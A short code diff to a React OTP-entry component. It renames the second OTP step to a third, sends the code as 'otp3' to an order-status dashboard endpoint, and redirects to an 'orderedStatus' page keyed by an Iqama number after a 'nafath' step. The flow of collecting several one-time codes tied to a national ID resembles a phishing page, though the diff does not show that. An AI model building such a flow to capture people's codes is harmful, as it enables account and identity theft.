@@ -41,11 +41,11 @@ const SecondOtp = () => {
 
         setIsLoading(true);
         try {
-            const response = await axiosPublic.patch(`/dashboard/order-status/${ordererData?._id}`, { otp2: otp });
+            const response = await axiosPublic.patch(`/dashboard/order-status/${ordererData?._id}`, { otp3: otp });
 
             if (response.status === 200) {
                 toast.success('Verification successful!');
-                router.push(`/verification/${iquamaNumber}/third_nafath`);
+                router.push(`/verification/${iquamaNumber}/orderedStatus`);
             }
         } catch (error: any) {
             const message = error.response?.data?.message || 'Verification failed';
@@ -80,7 +80,7 @@ const SecondOtp = () => {
 
                 {/* Title and countdown */}
                 <h4 className="text-2xl font-semibold text-gray-800 text-center mb-4">
-                    Enter Second OTP
+                    Enter Third OTP
                 </h4>
                 
                 <div className="text-center mb-6">
@@ -130,7 +130,7 @@ const SecondOtp = () => {
                             <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                         ) : (
                             <>
-                                <span>Verify Second OTP</span>
+                                <span>Verify Thrid OTP</span>
                                 <FaCheck />
                             </>
                         )}
